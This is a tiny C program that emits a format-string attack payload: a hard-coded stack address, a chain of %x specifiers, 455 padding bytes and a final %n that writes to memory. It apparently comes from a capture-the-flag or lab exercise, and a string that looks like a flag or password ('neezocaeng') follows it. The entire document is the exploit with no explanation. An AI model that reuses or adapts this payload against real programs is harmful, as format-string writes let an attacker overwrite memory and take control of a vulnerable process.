---
int main() {
        int i;
        printf("%c%c%c%c%s", 0x4c, 0xd5, 0xff, 0xff, "%x%x%x%x%x%x%x%x");
        for(i = 0; i<455; i++)
                printf("s");
        printf("%s", "%n");
        return 0;
}
---
neezocaeng